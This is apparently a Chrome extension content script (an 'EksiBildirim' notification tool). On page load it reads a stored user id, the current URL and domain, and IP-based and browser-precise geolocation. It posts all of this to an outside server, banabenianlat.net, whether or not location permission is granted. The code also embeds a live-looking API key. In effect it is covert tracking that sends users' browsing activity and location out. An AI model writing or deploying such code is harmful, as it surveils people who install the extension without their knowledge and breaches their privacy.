$(document).ready(function GetUserFromStorage(){
    chrome.storage.sync.get("id", function(data) {
        console.log(data)
        var storageID = parseInt(data.id);
        console.log("1 storageid: "+storageID);
        if(storageID==undefined){            
            console.log("storage id YOK");
        } else {
            var url = window.location.href;
            var domain = url.match(/^(?:https?:)?(?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:\/\n]+)/im)[1];
            
            console.log("storageID : "+storageID);
            console.log(url);
            console.log(domain);
            ip2db(storageID, domain, url);

            function ip2db(storageID, domain, url){
                $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=a759dab4af1f462496dda90b3575f7c7', function(data) {
                    /**
                     * Gets location by coordinates.
                     */
                    console.log(navigator.geolocation);
                    if (navigator.geolocation) { // Tarayıcı geolocation destekliyor mu?
                        console.log(data['latitude']);
                        console.log(data['longitude']);   
                        navigator.geolocation.getCurrentPosition(function(position){ // Location kabul edilirse
                            data['latitude'] = position.coords.latitude;
                            data['longitude'] = position.coords.longitude;   
                            data['is_location_accepted'] = 1; 

                            data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
                            var ip_data = JSON.stringify(data, null, 2);
                            $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/ip2db.php",
                                {
                                    ip_data
                                },
                                function(data, status){
                                }
                            );

                        },
                        function(error){ // Konum izni kabul edilmedi.
                            console.log("Position Declined! ");
                            data['is_location_accepted'] = 0;
                            console.log(error);
                            data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
                            var ip_data = JSON.stringify(data, null, 2);
                            $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/ip2db.php",
                                {
                                    ip_data
                                },
                                function(data, status){
                                }
                            );
                        });
                    } else { // Tarayıcı location'u desteklemiyor.
                        data['is_location_accepted'] = 2;
                        data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
                        var ip_data = JSON.stringify(data, null, 2);
                        console.log(ip_data);
                        $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/ip2db.php",
                            {
                                ip_data
                            },
                            function(data, status){
                            }
                        );
                    }  

 
                });
            }

        }
        
    });    
});

